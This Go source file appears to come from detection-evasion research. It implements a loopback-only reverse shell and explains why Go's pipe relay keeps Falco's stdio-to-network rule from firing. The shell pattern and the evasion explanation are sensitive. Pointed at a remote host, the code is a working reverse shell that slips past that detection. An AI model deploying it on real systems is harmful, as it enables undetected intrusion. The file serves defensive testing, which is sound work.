// reverse_shell composite (ATT&CK T1059) -- Go os/exec pipe-relay: the EVADE
// substrate, and the core of the mechanism-keyed fragility result.
//
// The idiomatic Go reverse shell dials a socket and runs /bin/sh with the
// net.Conn as stdin/stdout/stderr. Crucially, a net.Conn is NOT an *os.File, so
// os/exec cannot hand the socket fd to the child directly: it creates OS pipes
// (pipe2 + dup3, fd.type=fifo) and copies bytes between the conn and the pipes
// with background goroutines. The shell's stdio are therefore FIFOs, not the
// socket -- so Falco's "Redirect STDOUT/STDIN to Network Connection in
// Container" rule (fd.type in ipv4/ipv6) does NOT fire. The C/C++/Rust builds
// dup the socket itself onto stdio (fd.type=ipv4) and DO fire. Same behaviour,
// different runtime I/O model, different fd.type: the substrate mover.
//
// Self-contained, benign, deterministic: a loopback listener on 127.0.0.1:4444
// accepts the connection and sends "exit\n", so the shell runs only `exit`.
package main

import (
	"io"
	"net"
	"os/exec"
	"time"
)

func main() {
	ln, err := net.Listen("tcp", "127.0.0.1:4444")
	if err != nil {
		return
	}
	defer ln.Close()

	done := make(chan struct{})
	go func() {
		defer close(done)
		c, err := ln.Accept()
		if err != nil {
			return
		}
		c.Write([]byte("exit\n")) // drive the shell to terminate
		// Half-close so the client conn EOFs: os/exec's stdin-copy goroutine
		// blocks reading conn until EOF, so without this cmd.Run never returns.
		if tc, ok := c.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		io.Copy(io.Discard, c) // drain the shell's output until it closes
		c.Close()
	}()

	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		return
	}
	cmd := exec.Command("/bin/sh")
	// net.Conn != *os.File -> os/exec inserts pipes (fifo), so the shell's stdio
	// are FIFOs, not the socket. This is the evasion mechanism.
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	conn.Close()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
	}
}
